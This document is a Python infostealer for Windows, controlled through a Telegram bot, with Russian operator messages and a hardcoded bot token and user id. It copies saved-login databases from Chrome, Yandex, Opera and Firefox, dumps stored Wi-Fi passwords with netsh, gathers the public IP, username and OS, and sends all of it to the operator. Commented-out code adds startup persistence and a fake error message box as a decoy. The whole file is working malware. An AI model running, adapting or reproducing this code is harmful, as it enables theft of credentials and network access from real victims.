# -*- coding: utf-8 -*-

# Import modules
import telebot, sys, os, threading, subprocess, os.path, platform, re, bs4, requests, time, shutil, ctypes

# Token and user's id
token = '1979843897:AAEWjykTg0ieYzkZBGaD6szzz1IkHGli44c'
user = '1298271352'
pcUser = os.getlogin()
chrome_data = f'C:\\Users\\{pcUser}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'
yandex_data = f'C:\\Users\\{pcUser}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Passman logs'
opera_data = f'C:\\Users\\{pcUser}\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data'
firefox_data = f"C:\\Users\\{pcUser}\\AppData\\Roaming\\Mozilla\\Firefox\\default\\logins.json"
firefox_data2 = f"C:\\Users\\{pcUser}\\AppData\\Roaming\\Mozilla\\Firefox\\default\\key4.db"

bot = telebot.TeleBot(token)

def GetPasses():
	if os.path.isfile(chrome_data) is True:
		bot.send_message(user, 'Хоба, тут пароли от Сhrome нашлись, высылаю...')
		bot.send_document(user, open(chrome_data, 'rb'))

	if os.path.isfile(yandex_data) is True:
		bot.send_message(user, "Хоба, тут пароли от Яндекса нашлись, высылаю...")
		bot.send_document(user, open(yandex_data, 'rb'))

	if os.path.isfile(opera_data) is True:
		bot.send_message(user, 'Хоба, тут пароли от Оперы нашлись, высылаю...')
		bot.send_document(user, open(opera_data, 'rb'))

	if os.path.isfile(firefox_data) is True:
		bot.send_message(user, 'Хоба, тут пароли от Firefox нашлись, высылаю...')
		bot.send_document(user, open(firefox_data, 'rb'))
		bot.send_document(user, open(firefox_data2, 'rb'))

	time.sleep(5)

	sys.exit()

def Windows(): # Function for collect data about system
	System = platform.system()
	Release = platform.release()
	Version = System + ' ' + Release
	return Version

def GetIp():
	s = requests.get('https://2ip.ua/ru/')
	b = bs4.BeautifulSoup(s.text, "html.parser")
	a = b.select(" .ipblockgradient .ip")[0].getText()
	return a

def SendMessageBox(Message):
	ctypes.windll.user32.MessageBoxW(0, Message, u'', 0x40)
		
def StealWifiPasswords(): # Function for getting Wi-Fi and password
	global Password, SSID, Authentication, Cipher, SecurityKey
	Chcp = 'chcp 65001 && '
	Networks = subprocess.check_output(f'{Chcp}netsh wlan show profile',
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
	Networks = Networks.decode(encoding='utf-8', errors='strict')
	NetworkNamesList = re.findall('(?:Profile\\s*:\\s)(.*)', Networks) 
	for NetworkName in NetworkNamesList:
		CurrentResult = subprocess.check_output(f'{Chcp}netsh wlan show profile {NetworkName} key=clear',
			shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
		CurrentResult = CurrentResult.decode(encoding='utf-8', errors='strict')
		SSID = re.findall('(?:SSID name\\s*:\\s)(.*)', str(CurrentResult))[0].replace('\r', '').replace("\"", '')
		Authentication = re.findall(r'(?:Authentication\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Cipher = re.findall('(?:Cipher\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')
		SecurityKey = re.findall(r'(?:Security key\s*:\s)(.*)', CurrentResult)[0].replace('\r', '')
		Password = re.findall('(?:Key Content\\s*:\\s)(.*)', CurrentResult)[0].replace('\r', '')

	return Password, SSID, Authentication, Cipher, SecurityKey

StealWifiPasswords()

# threading.Thread(target=SendMessageBox('Connecting to api.telegram.org was unsucessful. Please check internet connection and try later.'))


# Collect info about Wi-Fi
wifi_data = """WiFi:
    SSID: {}    
    Password: {}        
    AUTH: {}    
    Cipher: {}    
    SecurityKey: {}""".format(SSID, Password, Authentication, Cipher, SecurityKey)

ip = GetIp()
ip = ip.replace('\n', '')
ip = ip.replace('	', '')
systemData = Windows()

Data = f"Компьютер подключен!🟢\n{wifi_data}\nПользователь -> {pcUser}\nWindows -> {systemData}\nIP -> {ip}"

bot.send_message(user, Data)

GetPasses()

time.sleep(5)

#CurPath = os.getcwd()
#CurPath = CurPath + '\\main.py'
#
#AutorunPath = f'C:\\Users\\{pcUser}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.pyw'
#
#shutil.copyfile(CurPath, AutorunPath)
#bot.send_message(user, "Усе в автозагрузке")

if __name__ == '__main__':
	bot.infinity_polling()
